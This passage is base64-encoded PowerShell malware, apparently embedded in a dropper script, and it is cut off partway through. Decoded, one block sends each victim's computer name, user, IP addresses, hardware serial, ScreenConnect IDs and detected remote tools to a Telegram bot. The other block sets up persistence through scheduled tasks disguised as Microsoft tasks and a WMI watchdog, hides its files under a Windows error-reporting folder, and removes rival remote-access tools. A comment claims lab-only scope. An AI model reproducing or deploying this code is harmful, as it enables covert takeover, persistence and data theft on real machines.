dExpbmUgPSBHZXQtU3ZjTGluZSAkYWx0DQokcHJpbU9rID0gJHByaW1MaW5lIC1saWtlICdSdW5u
aW5nKicNCiRkZXBsb3lPayA9ICRwcmltT2sgLWFuZCAoJHRhc2tPayAtZ2UgMykgLWFuZCAkaGFz
TW9uDQoNCiRlbW9qaU1hcCA9IEB7DQogICAgT0sgICAgICAgPSBbc3RyaW5nXShbY2hhcl0weDI3
MDUpDQogICAgRE9XTiAgICAgPSAoW3N0cmluZ11bY2hhcl06OkNvbnZlcnRGcm9tVXRmMzIoMHgx
RjZBOCkpDQogICAgUkVTVE9SRUQgPSAoW3N0cmluZ11bY2hhcl06OkNvbnZlcnRGcm9tVXRmMzIo
MHgxRjdFMikpDQogICAgRkFJTCAgICAgPSBbc3RyaW5nXShbY2hhcl0weDI3NEMpDQogICAgRk9S
Q0UgICAgPSBbc3RyaW5nXShbY2hhcl0weDI2QTEpDQogICAgREVQTE9ZICAgPSAoW3N0cmluZ11b
Y2hhcl06OkNvbnZlcnRGcm9tVXRmMzIoMHgxRjY4MCkpDQogICAgSEIgICAgICAgPSAoW3N0cmlu
Z11bY2hhcl06OkNvbnZlcnRGcm9tVXRmMzIoMHgxRjRFMSkpDQp9DQoka2V5ID0gJFN0YXRlLlRv
VXBwZXJJbnZhcmlhbnQoKQ0KJGVtb2ppID0gaWYgKCRlbW9qaU1hcC5Db250YWluc0tleSgka2V5
KSkgeyAkZW1vamlNYXBbJGtleV0gfSBlbHNlIHsgKFtzdHJpbmddW2NoYXJdOjpDb252ZXJ0RnJv
bVV0ZjMyKDB4MUY0RjEpKSB9DQoNCiR0aXRsZSA9IHN3aXRjaCAoJGtleSkgew0KICAgICdPSycg
eyAnUHJpbWFyeSBoZWFsdGh5JyB9DQogICAgJ0RPV04nIHsgJ1ByaW1hcnkgRE9XTiAtIGhlYWxp
bmcnIH0NCiAgICAnUkVTVE9SRUQnIHsgJ1ByaW1hcnkgUkVTVE9SRUQnIH0NCiAgICAnRkFJTCcg
eyAnSGVhbCBGQUlMRUQnIH0NCiAgICAnRk9SQ0UnIHsgJ0ZvcmNlZCByZWluc3RhbGwnIH0NCiAg
ICAnREVQTE9ZJyB7IGlmICgkZGVwbG95T2spIHsgJ0ZJUlNUIERFUExPWSBPSycgfSBlbHNlIHsg
J0ZJUlNUIERFUExPWSAtIENIRUNLIE5FRURFRCcgfSB9DQogICAgJ0hCJyB7ICdob3VybHkgZGln
ZXN0JyB9DQogICAgZGVmYXVsdCB7ICJTdGF0ZTogJFN0YXRlIiB9DQp9DQoNCiR0cmFucyA9IGlm
ICgkT2xkU3RhdGUpIHsgIiRPbGRTdGF0ZSAtPiAkU3RhdGUiIH0gZWxzZSB7ICRTdGF0ZSB9DQok
c2NMaXN0ID0gR2V0LVNjSW5zdGFsbHMNCiRybW1IaXRzID0gR2V0LVJtbUhpdHMNCmlmICgkcm1t
SGl0cy5Db3VudCAtZXEgMCkgeyBbdm9pZF0kcm1tSGl0cy5BZGQoJy0gKG5vbmUgZGV0ZWN0ZWQp
JykgfQ0KDQokcHViID0gR2V0LVB1YmxpY0lwDQokbGFuID0gR2V0LUxvY2FsSXBzDQokbm93ID0g
R2V0LURhdGUgLUZvcm1hdCAneXl5eS1NTS1kZCBISDptbTpzcyB6enonDQokdXB0aW1lID0gJ24v
YScNCnRyeSB7DQogICAgJGJvb3QgPSAoR2V0LUNpbUluc3RhbmNlIFdpbjMyX09wZXJhdGluZ1N5
c3RlbSkuTGFzdEJvb3RVcFRpbWUNCiAgICAkdXB0aW1lID0gJ3swOmRkfWQgezA6aGh9aCB7MDpt
bX1tJyAtZiAoKEdldC1EYXRlKSAtICRib290KQ0KfSBjYXRjaCB7fQ0KDQojIGNhbXBhaWduIHN0
YXRlIGZpbGUgKHdyaXR0ZW4gYnkgb3duX2xpYi5wczEgc3RhdGUgYWN0aW9uKQ0KJHN0YXRlTGlu
ZSA9ICduL2EnDQokc3RhdGVPYmogPSAkbnVsbA0KJHN0YXRlUGF0aDIgPSBKb2luLVBhdGggJFdv
cmtEaXIgJ3N0YXRlLmpzb24nDQppZiAoVGVzdC1QYXRoICRzdGF0ZVBhdGgyKSB7DQogICAgJHJh
d1N0YXRlID0gKEdldC1Db250ZW50IC1MaXRlcmFsUGF0aCAkc3RhdGVQYXRoMiAtUmF3KS5Ucmlt
KCkNCiAgICB0cnkgew0KICAgICAgICAkc3RhdGVPYmogPSAkcmF3U3RhdGUgfCBDb252ZXJ0RnJv
bS1Kc29uDQogICAgICAgICRmb3JlaWduQ3N2ID0gaWYgKCRzdGF0ZU9iai5mb3JlaWduKSB7ICgk
c3RhdGVPYmouZm9yZWlnbiAtam9pbiAnLCcpIH0gZWxzZSB7ICctJyB9DQogICAgICAgICRzdGF0
ZUxpbmUgPSAicHJpbT0kKCRzdGF0ZU9iai5wcmltKSBhbHQ9JCgkc3RhdGVPYmouYWx0KSBmb3Jl
aWduPVskZm9yZWlnbkNzdl0gdGFza3M9JCgkc3RhdGVPYmoudGFza3NPaykvJCgkc3RhdGVPYmou
dGFza3NUb3RhbCkgd2Q9JCgkc3RhdGVPYmoud2F0Y2hkb2cpIGhlYWxzPSQoJHN0YXRlT2JqLmlu
c3RhbGxDb3VudCkiDQogICAgfSBjYXRjaCB7ICRzdGF0ZUxpbmUgPSAkcmF3U3RhdGUgfQ0KfQ0K
DQokZGVwbG95QmxvY2sgPSAnJw0KaWYgKCRrZXkgLWVxICdERVBMT1knKSB7DQogICAgJHZlcmRp
Y3QgPSBpZiAoJGRlcGxveU9rKSB7ICdERVBMT1lFRCAvIEhFQUxUSFknIH0gZWxzZSB7ICdERVBM
T1lFRCBCVVQgSU5DT01QTEVURScgfQ0KICAgICRmb3JlaWduID0gQChHZXQtQ2hpbGRJdGVtIC1Q
YXRoICIke2VudjpQcm9ncmFtRmlsZXN9XFNjcmVlbkNvbm5lY3QgQ2xpZW50KiIsIiR7ZW52OlBy
b2dyYW1GaWxlcyh4ODYpfVxTY3JlZW5Db25uZWN0IENsaWVudCoiIC1EaXJlY3RvcnkgLUVycm9y
QWN0aW9uIFNpbGVudGx5Q29udGludWUgfA0KICAgICAgICBXaGVyZS1PYmplY3QgeyAkXy5OYW1l
IC1ub3RtYXRjaCAnNWY2MDEwNTc5ODUyZTUwN3xmODYxYzgxNDBkNDUzNDI3JyB9KQ0KICAgICRk
aWFnTGluZXMgPSBOZXctT2JqZWN0IFN5c3RlbS5Db2xsZWN0aW9ucy5HZW5lcmljLkxpc3Rbc3Ry
aW5nXQ0KICAgICRib290UGF0aCA9IEpvaW4tUGF0aCAkV29ya0RpciAnYm9vdC5lcnInDQogICAg
aWYgKFRlc3QtUGF0aCAkYm9vdFBhdGgpIHsNCiAgICAgICAgJGludGVyZXN0aW5nID0gQCgNCiAg
ICAgICAgICAgICdtc2lfJywgJ2ZldGNoXycsICdwcmltYXJ5XycsICdudWtlXycsICdtc2lfdG9v
JywgJ21zaV9mZXRjaCcsICdtc2lfZXhpdCcsDQogICAgICAgICAgICAnbXNpX3VuYXZhaWxhYmxl
JywgJ3NlY3VyZV8nLCAnZ29fJw0KICAgICAgICApDQogICAgICAgIEdldC1Db250ZW50IC1MaXRl
cmFsUGF0aCAkYm9vdFBhdGggLUVycm9yQWN0aW9uIFNpbGVudGx5Q29udGludWUgfA0KICAgICAg
ICAgICAgV2hlcmUtT2JqZWN0IHsNCiAgICAgICAgICAgICAgICAkbGluZSA9ICRfDQogICAgICAg
ICAgICAgICAgZm9yZWFjaCAoJHQgaW4gJGludGVyZXN0aW5nKSB7IGlmICgkbGluZSAtbGlrZSAi
KiR0KiIpIHsgcmV0dXJuICR0cnVlIH0gfQ0KICAgICAgICAgICAgICAgICRmYWxzZQ0KICAgICAg
ICAgICAgfSB8DQogICAgICAgICAgICBTZWxlY3QtT2JqZWN0IC1MYXN0IDE4IHwNCiAgICAgICAg
ICAgIEZvckVhY2gtT2JqZWN0IHsgW3ZvaWRdJGRpYWdMaW5lcy5BZGQoKCctIDxjb2RlPnswfTwv
Y29kZT4nIC1mIChFc2MgKCRfIC1yZXBsYWNlICdbXlx4MjAtXHg3RV0nLCAnPycpKSkpIH0NCiAg
ICB9DQogICAgaWYgKCRkaWFnTGluZXMuQ291bnQgLWVxIDApIHsgW3ZvaWRdJGRpYWdMaW5lcy5B
ZGQoJy0gKG5vIGluc3RhbGwvbnVrZSBtYXJrZXJzIGluIGJvb3QuZXJyKScpIH0NCiAgICAkZGVw
bG95QmxvY2sgPSBAIg0KDQo8Yj5EZXBsb3kgdmVyZGljdDwvYj4NCi0gUmVzdWx0OiA8Yj4kKEVz
YyAkdmVyZGljdCk8L2I+DQotIFByaW1hcnkgUnVubmluZzogJChpZiAoJHByaW1PaykgeyAnWUVT
JyB9IGVsc2UgeyAnTk8nIH0pDQotIE1vbml0b3Igc2NyaXB0ICgud3VjYWNoZVxvd25fbW9uLmNt
ZCk6ICQoaWYgKCRoYXNNb24pIHsgJ1lFUycgfSBlbHNlIHsgJ05PJyB9KQ0KLSBCYWNrdXAgbW9u
ICguZXRsY2FjaGVcZXRsX21vbi5jbWQpOiAkKGlmICgkaGFzRXRsKSB7ICdZRVMnIH0gZWxzZSB7
ICdOTycgfSkNCi0gUGVyc2lzdCB0YXNrcyBPSzogJHRhc2tPayAvICQoJGV4cGVjdGVkVGFza3Mu
Q291bnQpIChiYWQvbWlzc2luZzogJHRhc2tCYWQpDQotIE1TSSBjYWNoZTogJChFc2MgJG1zaVNp
emUpDQotIEZvcmVpZ24gU0MgZm9sZGVycyBsZWZ0OiAkKCRmb3JlaWduLkNvdW50KQ0KLSBOb3Rl
OiBMYXN0UmVzdWx0IDI2NzAxMSA9IHRhc2sgbm90IHlldCBydW4gKG5vcm1hbCByaWdodCBhZnRl
ciBjcmVhdGUpDQoNCjxiPkRlcGxveSBsb2cgbWFya2VyczwvYj4NCiQoJGRpYWdMaW5lcyAtam9p
biAiYG4iKQ0KIkANCn0NCg0KJHRleHQgPSBAIg0KJGVtb2ppIDxiPlNDIE1vbml0b3IgLSAkKEVz
YyAkdGl0bGUpPC9iPg0KDQo8Yj5FdmVudDwvYj4NCi0gU3VtbWFyeTogJChFc2MgJFN1bW1hcnkp
DQotIFRyYW5zaXRpb246IDxjb2RlPiQoRXNjICR0cmFucyk8L2NvZGU+DQotIFdoZW46ICQoRXNj
ICRub3cpDQokZGVwbG95QmxvY2sNCg0KPGI+SG9zdDwvYj4NCi0gQ29tcHV0ZXI6IDxjb2RlPiQo
RXNjICRlbnY6Q09NUFVURVJOQU1FKTwvY29kZT4NCi0gVXNlcjogPGNvZGU+JChFc2MgJHdobyk8
L2NvZGU+DQotIEVsZXZhdGVkOiAkZWxldiB8IFNZU1RFTTogJGlzU3lzdGVtDQotIERvbWFpbi9X
b3JrZ3JvdXA6ICQoRXNjICRvcy5Eb21haW4pDQoNCjxiPk5ldHdvcms8L2I+DQotIExBTiBJUHM6
IDxjb2RlPiQoRXNjICRsYW4pPC9jb2RlPg0KLSBQdWJsaWMgSVA6IDxjb2RlPiQoRXNjICRwdWIp
PC9jb2RlPg0KDQo8Yj5PUyAvIEhhcmR3YXJlPC9iPg0KLSBPUzogJChFc2MgJG9zLkNhcHRpb24p
DQotIFZlcnNpb246ICQoRXNjICRvcy5WZXJzaW9uKSAoYnVpbGQgJChFc2MgJG9zLkJ1aWxkKSkg
JChFc2MgJG9zLkFyY2gpDQotIEluc3RhbGw6ICQoRXNjICRvcy5JbnN0YWxsRGF0ZSkgfCBMYXN0
IGJvb3Q6ICQoRXNjICRvcy5MYXN0Qm9vdCkNCi0gVXB0aW1lOiAkKEVzYyAkdXB0aW1lKQ0KLSBD
UFU6ICQoRXNjICRvcy5DUFUpDQotIEhhcmR3YXJlOiAkKEVzYyAkb3MuTWFudWZhY3R1cmVyKSAk
KEVzYyAkb3MuTW9kZWwpDQotIFNlcmlhbDogPGNvZGU+JChFc2MgJG9zLlNlcmlhbCk8L2NvZGU+
DQotIFJBTTogJCgkb3MuVG90YWxSQU1fR0IpIEdCDQotIERpc2sgQzogJCgkb3MuRGlza0ZyZWVf
R0IpIEdCIGZyZWUgLyAkKCRvcy5EaXNrU2l6ZV9HQikgR0INCg0KPGI+U2NyZWVuQ29ubmVjdCAo
YWxsKTwvYj4NCi0gUHJpbWFyeSA8Y29kZT41ZjYwMTA1Nzk4NTJlNTA3PC9jb2RlPjogJChFc2Mg
JHByaW1MaW5lKQ0KLSBBbHQgPGNvZGU+Zjg2MWM4MTQwZDQ1MzQyNzwvY29kZT46ICQoRXNjICRh
bHRMaW5lKQ0KJCgkc2NMaXN0IC1qb2luICJgbiIpDQoNCjxiPk90aGVyIFJNTSAvIHJlbW90ZSB0
b29sczwvYj4NCiQoJHJtbUhpdHMgLWpvaW4gImBuIikNCg0KPGI+UGVyc2lzdCB0YXNrcyAoZXhw
ZWN0ZWQpPC9iPg0KJCgkdGFza0xpbmVzIC1qb2luICJgbiIpDQoNCjxiPkNhY2hlPC9iPg0KLSBN
U0kgY2FjaGU6ICQoRXNjICRtc2lTaXplKQ0KLSBXb3JrRGlyOiA8Y29kZT4kKEVzYyAkV29ya0Rp
cik8L2NvZGU+DQoNCjxiPkNhbXBhaWduIHN0YXRlPC9iPg0KLSA8Y29kZT4kKEVzYyAkc3RhdGVM
aW5lKTwvY29kZT4NCg0KPGk+Qm90OiBAbm9idWRkeXJtbUJvdCB8IFRHX1JFUE9SVCBUODwvaT4N
CiJADQoNCiMgY29tcGFjdCBkaWdlc3QgbW9kZTogb25lIHNob3J0IGxpbmUsIEhUTUwtZnJlZSAo
aG91cmx5IGhlYXJ0YmVhdCkNCmlmICgkTW9kZSAtZXEgJ2NvbXBhY3QnKSB7DQogICAgJGZvcmVp
Z25OID0gMA0KICAgIGlmICgkc3RhdGVPYmogLWFuZCAkc3RhdGVPYmouZm9yZWlnbikgeyAkZm9y
ZWlnbk4gPSBAKCRzdGF0ZU9iai5mb3JlaWduKS5Db3VudCB9DQogICAgJG1zaVNob3J0ID0gaWYg
KFRlc3QtUGF0aCAkbXNpQ2FjaGUpIHsgJ3swOk4wfUtCJyAtZiAoKEdldC1JdGVtICRtc2lDYWNo
ZSAtRm9yY2UpLkxlbmd0aCAvIDFLQikgfSBlbHNlIHsgJzAnIH0NCiAgICAkcHJpbVNob3J0ID0g
aWYgKCRwcmltT2spIHsgJ09LJyB9IGVsc2UgeyAnRE9XTicgfQ0KICAgICRhbHRTaG9ydCA9IGlm
ICgkYWx0TGluZSAtbGlrZSAnUnVubmluZyonKSB7ICdPSycgfSBlbHNlIHsgJy0nIH0NCiAgICAk
dGV4dCA9ICIkZW1vamkgU0NEfCQoJGVudjpDT01QVVRFUk5BTUUpfHByaW09JHByaW1TaG9ydHxh
bHQ9JGFsdFNob3J0fGZvcmVpZ249JGZvcmVpZ25OfHRhc2tzPSR0YXNrT2svNXxtc2k9JG1zaVNo
b3J0fHVwPSR1cHRpbWV8Yj0kQnVpbGR8JG5vdyINCn0NCg0KaWYgKCR0ZXh0Lkxlbmd0aCAtZ3Qg
MzgwMCkgew0KICAgICRybW1IaXRzID0gQCgoJHJtbUhpdHMgfCBTZWxlY3QtT2JqZWN0IC1GaXJz
dCAxMikpICsgKCctIC4uLiAoezB9IG1vcmUpJyAtZiAoJHJtbUhpdHMuQ291bnQgLSAxMikpDQog
ICAgJHNjTGlzdCA9IEAoKCRzY0xpc3QgfCBTZWxlY3QtT2JqZWN0IC1GaXJzdCAxNCkpICsgKCct
IC4uLiAoezB9IG1vcmUpJyAtZiAoJHNjTGlzdC5Db3VudCAtIDE0KSkNCiAgICAkdGV4dCA9ICR0
ZXh0LlN1YnN0cmluZygwLCAzODAwKSArICJgbmBuPGk+VFJVTkNBVEVEIChUZWxlZ3JhbSA0MDk2
IGxpbWl0KTwvaT4iDQp9DQoNCiRsb2cgPSBKb2luLVBhdGggJFdvcmtEaXIgJ2Jvb3QuZXJyJw0K
ZnVuY3Rpb24gU2VuZC1UZyhbc3RyaW5nXSRtc2csIFtzdHJpbmddJG1vZGUpIHsNCiAgICAkcGF5
bG9hZCA9IEB7DQogICAgICAgIGNoYXRfaWQgICAgICAgICAgICAgICAgICA9ICRjZmcuQ0hBVF9J
RA0KICAgICAgICB0ZXh0ICAgICAgICAgICAgICAgICAgICAgPSAkbXNnDQogICAgICAgIGRpc2Fi
bGVfd2ViX3BhZ2VfcHJldmlldyA9ICR0cnVlDQogICAgfQ0KICAgIGlmICgkbW9kZSkgeyAkcGF5
bG9hZC5wYXJzZV9tb2RlID0gJG1vZGUgfQ0KICAgICRqc29uID0gJHBheWxvYWQgfCBDb252ZXJ0
VG8tSnNvbiAtQ29tcHJlc3MgLURlcHRoIDUNCiAgICAkYnl0ZXMgPSBbU3lzdGVtLlRleHQuRW5j
b2RpbmddOjpVVEY4LkdldEJ5dGVzKCRqc29uKQ0KICAgIEludm9rZS1SZXN0TWV0aG9kIC1Vcmkg
KCJodHRwczovL2FwaS50ZWxlZ3JhbS5vcmcvYm90JCgkY2ZnLkJPVF9UT0tFTikvc2VuZE1lc3Nh
Z2UiKSBgDQogICAgICAgIC1NZXRob2QgUG9zdCAtQm9keSAkYnl0ZXMgLUNvbnRlbnRUeXBlICdh
cHBsaWNhdGlvbi9qc29uOyBjaGFyc2V0PXV0Zi04JyB8IE91dC1OdWxsDQp9DQoNCmZ1bmN0aW9u
IFNlbmQtVGdTYWZlKFtzdHJpbmddJG1zZywgW3N0cmluZ10kbW9kZSkgew0KICAgICR0b1NlbmQg
PSAkbXNnDQogICAgdHJ5IHsNCiAgICAgICAgU2VuZC1UZyAtbXNnICR0b1NlbmQgLW1vZGUgJG1v
ZGUNCiAgICAgICAgcmV0dXJuICR0cnVlDQogICAgfSBjYXRjaCB7DQogICAgICAgIHRyeSB7DQog
ICAgICAgICAgICBTZW5kLVRnIC1tc2cgKCR0b1NlbmQuU3Vic3RyaW5nKDAsIDMwMDApICsgImBu
PGk+VFJVTkNBVEVEPC9pPiIpIC1tb2RlICRtb2RlDQogICAgICAgICAgICByZXR1cm4gJHRydWUN
CiAgICAgICAgfSBjYXRjaCB7DQogICAgICAgICAgICByZXR1cm4gJGZhbHNlDQogICAgICAgIH0N
CiAgICB9DQp9DQoNCnRyeSB7DQogICAgaWYgKFNlbmQtVGdTYWZlIC1tc2cgJHRleHQgLW1vZGUg
J0hUTUwnKSB7DQogICAgICAgIEFkZC1Db250ZW50IC1MaXRlcmFsUGF0aCAkbG9nIC1WYWx1ZSAn
dGdfc2VudF9yaWNoJyAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51ZQ0KICAgIH0gZWxzZSB7
DQogICAgICAgIHRocm93ICdodG1sX2ZhaWxlZCcNCiAgICB9DQogICAgaWYgKCRrZXkgLWVxICdE
RVBMT1knKSB7DQogICAgICAgIEFkZC1Db250ZW50IC1MaXRlcmFsUGF0aCAkbG9nIC1WYWx1ZSAo
InRnX2RlcGxveV9vaz0iICsgJGRlcGxveU9rKSAtRXJyb3JBY3Rpb24gU2lsZW50bHlDb250aW51
ZQ0KICAgICAgICBTZXQtQ29udGVudCAtTGl0ZXJhbFBhdGggKEpvaW4tUGF0aCAkV29ya0RpciAn
ZGVwbG95X3RnLmZsYWcnKSAtVmFsdWUgKEdldC1EYXRlIC1Gb3JtYXQgJ28nKSAtRXJyb3JBY3Rp
b24gU2lsZW50bHlDb250aW51ZQ0KICAgIH0NCn0gY2F0Y2ggew0KICAgIHRyeSB7DQogICAgICAg
ICRwbGFpbiA9IFtyZWdleF06OlJlcGxhY2UoJHRleHQsICc8W14+XSs+JywgJycpDQogICAgICAg
ICRwbGFpbiA9IFtTeXN0ZW0uTmV0LldlYlV0aWxpdHldOjpIdG1sRGVjb2RlKCRwbGFpbikNCiAg
ICAgICAgaWYgKCRwbGFpbi5MZW5ndGggLWd0IDM1MDApIHsgJHBsYWluID0gJHBsYWluLlN1YnN0
cmluZygwLCAzNTAwKSArICJgblRSVU5DQVRFRCIgfQ0KICAgICAgICBTZW5kLVRnU2FmZSAtbXNn
ICRwbGFpbiAtbW9kZSAnJyB8IE91dC1OdWxsDQogICAgICAgIEFkZC1Db250ZW50IC1MaXRlcmFs
UGF0aCAkbG9nIC1WYWx1ZSAndGdfc2VudF9wbGFpbicgLUVycm9yQWN0aW9uIFNpbGVudGx5Q29u
dGludWUNCiAgICB9IGNhdGNoIHsNCiAgICAgICAgQWRkLUNvbnRlbnQgLUxpdGVyYWxQYXRoICRs
b2cgLVZhbHVlICgidGdfZmFpbCAiICsgJF8uRXhjZXB0aW9uLk1lc3NhZ2UpIC1FcnJvckFjdGlv
biBTaWxlbnRseUNvbnRpbnVlDQogICAgfQ0KfQ0K
::B64_TGR_END
::B64_LIB_BEGIN
I1JlcXVpcmVzIC1WZXJzaW9uIDUuMQ0KIyDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDi
lZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZDilZANCiMgT1dOX0xJQiAg
QlVJTEQgMjAyNjA4MDJMNQ0KIyBTaGFyZWQgbGlicmFyeTogcGVyLWhvc3QgaWRlbnRpdHkgKGFu
dGktc2lnbmF0dXJlKSwgV01JIHdhdGNoZG9nDQojIChtdXR1YWwgcGVyc2lzdGVuY2UgY2hhaW4p
LCBjYW1wYWlnbiBzdGF0ZSBmaWxlLCBTQyBzZXJ2aWNlIHJlcGFpci4NCiMgTDI6IHNhZmUgdGFz
ay1uYW1lIHBvb2xzIChwYXJlbnRzIGV4aXN0IG9uIGFsbCBXaW4xMC8xMSksIElERU5UVkVSDQoj
IHJlZ2VuZXJhdGlvbiwgLUFjdGlvbiByZXBhaXIgcmVjcmVhdGVzIGRlbGV0ZWQgU0Mgc2Vydmlj
ZXMgdmlhDQojIG1zaWV4ZWMgL2ZhIHtHVUlEfSAobmV2ZXIgdHJpZ2dlcnMgU0MtZmFtaWx5IG1h
am9yLXVwZ3JhZGUgcmVtb3ZhbCkuDQojIEwzOiAtQWN0aW9uIGV4dGVybWluYXRlIC0gdHJ1ZSBy
ZW1vdmFsIGVuZ2luZSBmb3IgZm9yZWlnbiBTY3JlZW5Db25uZWN0DQojIChNU0kgdW5pbnN0YWxs
ICsgc3ZjL3Byb2MvZGlyIGtpbGwpIGFuZCBkaXNhbGxvd2VkIFJNTSB0b29scy4NCiMgQXV0aG9y
aXplZCBpbnRlcm5hbCBkZXBsb3ltZW50IC0gbGFiL2NvbXBldGl0aW9uIHNjb3BlIG9ubHkuDQoj
IOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKVkOKV
kOKVkOKVkOKVkOKVkOKVkOKVkA0KW0NtZGxldEJpbmRpbmcoKV0NCnBhcmFtKA0KICAgIFtQYXJh
bWV0ZXIoTWFuZGF0b3J5ID0gJHRydWUpXQ0KICAgIFtWYWxpZGF0ZVNldCgnaW5pdCcsICd3YXRj
aGRvZycsICd3YXRjaGRvZy1lbnN1cmUnLCAnc3RhdGUnLCAnaWRlbnRpdHknLCAncmVwYWlyJywg
J3JlZ2lzdGVyZWQnLCAnZXh0ZXJtaW5hdGUnKV0NCiAgICBbc3RyaW5nXSRBY3Rpb24sDQogICAg
W3N0cmluZ10kV29ya0RpciA9ICdDOlxQcm9ncmFtRGF0YVxNaWNyb3NvZnRcV2luZG93c1xXRVJc
VGVtcFwud3VjYWNoZScsDQogICAgW3N0cmluZ10kTW9uUGF0aCA9ICcnLA0KICAgIFtzdHJpbmdd
JEJ1aWxkICA9ICdPMTUnLA0KICAgIFtzdHJpbmddJEV4dHJhICA9ICcnLA0KICAgIFtzdHJpbmdd
JEZwICAgICA9ICcnDQopDQoNCiRFcnJvckFjdGlvblByZWZlcmVuY2UgPSAnU2lsZW50bHlDb250
aW51ZScNCiRjZmdQYXRoID0gSm9pbi1QYXRoICRXb3JrRGlyICdpZGVudGl0eS5jZmcnDQokSWRl
bnRWZXJzaW9uID0gMw0KDQojIExlZ2l0LWxvb2tpbmcgdGFzay1uYW1lIHBvb2xzOyBwZXItaG9z
dCBoYXNoIHBpY2tzIG9uZSBwZXIgc2xvdC4NCiMgdjI6IE9OTFkgcGFyZW50IGZvbGRlcnMgdGhh
dCBleGlzdCBvbiBldmVyeSBXaW4xMC8xMSAoV3dhblN2Yy9NZW1vcnlEaWFnbm9zdGljLw0KIyBQ
b3dlckVmZmljaWVuY3kvRGlza0RpYWdub3N0aWMgcGFyZW50cyBhcmUgYWJzZW50IG9uIHNvbWUg
bWFjaGluZXMgLT4gL0NyZWF0ZSBmYWlsZWQpLg0KJFBvb2xzID0gQHsNCiAgICBBID0gQCgnXE1p
Y3Jvc29mdFxXaW5kb3dzXERpYWdub3Npc1xTY2hlZHVsZWQnLCdcTWljcm9zb2Z0XFdpbmRvd3Nc
RGlhZ25vc2lzXEJWVENvbnN1bWVyJywnXE1pY3Jvc29mdFxXaW5kb3dzXE5ldFRyYWNlXEdhdGhl
ck5ldHdvcmtJbmZvJywnXE1pY3Jvc29mdFxXaW5kb3dzXFdESVxSZXNvbHV0aW9uSG9zdCcsJ1xN
aWNyb3NvZnRcV2luZG93c1xQTEFcU2VydmVyIERpYWdub3N0aWNzJywnXE1pY3Jvc29mdFxXaW5k
b3dzXFRjcGlwXElwQWRkcmVzc0NvbmZsaWN0MScsJ1xNaWNyb3NvZnRcV2luZG93c1xQTEFcU2Vy
dmVyJywnXE1pY3Jvc29mdFxXaW5kb3dzXERpYWdub3Npc1xTUlRhc2snKQ0KICAgIEIgPSBAKCdc
TWljcm9zb2Z0XFdpbmRvd3NcUExBXFNlcnZlcicsJ1xNaWNyb3NvZnRcV2luZG93c1xXRElcUmVz
b2x1dGlvbkhvc3QnLCdcTWljcm9zb2Z0XFdpbmRvd3NcRGlhZ25vc2lzXEJWVENvbnN1bWVyJywn
XE1pY3Jvc29mdFxXaW5kb3dzXE5ldFRyYWNlXEdhdGhlck5ldHdvcmtJbmZvJywnXE1pY3Jvc29m
dFxXaW5kb3dzXERpYWdub3Npc1xTY2hlZHVsZWQnLCdcTWljcm9zb2Z0XFdpbmRvd3NcVGNwaXBc
SXBBZGRyZXNzQ29uZmxpY3QyJywnXE1pY3Jvc29mdFxXaW5kb3dzXFBMQVxTZXJ2ZXIgRGlhZ25v
c3RpY3MnLCdcTWljcm9zb2Z0XFdpbmRvd3NcRGlhZ25vc2lzXFNSVGFzaycpDQogICAgQyA9IEAo
J1xNaWNyb3NvZnRcV2luZG93c1xXRElcUmVzb2x1dGlvbkhvc3QnLCdcTWljcm9zb2Z0XFdpbmRv
d3NcTmV0VHJhY2VcR2F0aGVyTmV0d29ya0luZm8nLCdcTWljcm9zb2Z0XFdpbmRvd3NcVGNwaXBc
SXBBZGRyZXNzQ29uZmxpY3QxJywnXE1pY3Jvc29mdFxXaW5kb3dzXERpYWdub3Npc1xCVlRDb25z
dW1lcicsJ1xNaWNyb3NvZnRcV2luZG93c1xQTEFcU2VydmVyJywnXE1pY3Jvc29mdFxXaW5kb3dz
XERpYWdub3Npc1xTY2hlZHVsZWQnLCdcTWljcm9zb2Z0XFdpbmRvd3NcUExBXFNlcnZlciBEaWFn
bm9zdGljcycsJ1xNaWNyb3NvZnRcV2luZG93c1xEaWFnbm9zaXNcU1JUYXNrJykNCiAgICBEID0g
QCgnXE1pY3Jvc29mdFxXaW5kb3dzXFRjcGlwXElwQWRkcmVzc0NvbmZsaWN0MScsJ1xNaWNyb3Nv
ZnRcV2luZG93c1xXRElcUmVzb2x1dGlvbkhvc3QnLCdcTWljcm9zb2Z0XFdpbmRvd3NcTmV0VHJh
Y2VcR2F0aGVyTmV0d29ya0luZm8nLCdcTWljcm9zb2Z0XFdpbmRvd3NcRGlhZ25vc2lzXEJWVENv
bnN1bWVyJywnXE1pY3Jvc29mdFxXaW5kb3dzXFBMQVxTZXJ2ZXInLCdcTWljcm9zb2Z0XFdpbmRv
d3NcRGlhZ25vc2lzXFNjaGVkdWxlZCcsJ1xNaWNyb3NvZnRcV2luZG93c1xQTEFcU2VydmVyIERp
YWdub3N0aWNzJywnXE1pY3Jvc29mdFxXaW5kb3dzXERpYWdub3Npc1xTUlRhc2snKQ0KfQ0KJERl
ZmF1bHRzID0gW29yZGVyZWRdQHsNCiAgICBUQVNLX0EgPSAnXE1pY3Jvc29mdFxXaW5kb3dzXERp
YWdub3Npc1xTY2hlZHVsZWQnDQogICAgVEFTS19CID0gJ1xNaWNyb3NvZnRcV2luZG93c1xQTEFc
U2VydmVyJw0KICAgIFRBU0tfQyA9ICdcTWljcm9zb2Z0XFdpbmRvd3NcV0RJXFJlc29sdXRpb25I
b3N0Jw0KICAgIFRBU0tfRCA9ICdcTWljcm9zb2Z0XFdpbmRvd3NcVGNwaXBcSXBBZGRyZXNzQ29u
ZmxpY3QxJw0KICAgIE1PX0EgICA9ICcyJw0KICAgIE1PX0IgICA9ICczJw0KfQ0KDQpmdW5jdGlv
biBHZXQtSG9zdFNlZWQgew0KICAgICRzID0gMEwNCiAgICBmb3JlYWNoICgkYyBpbiAkZW52OkNP
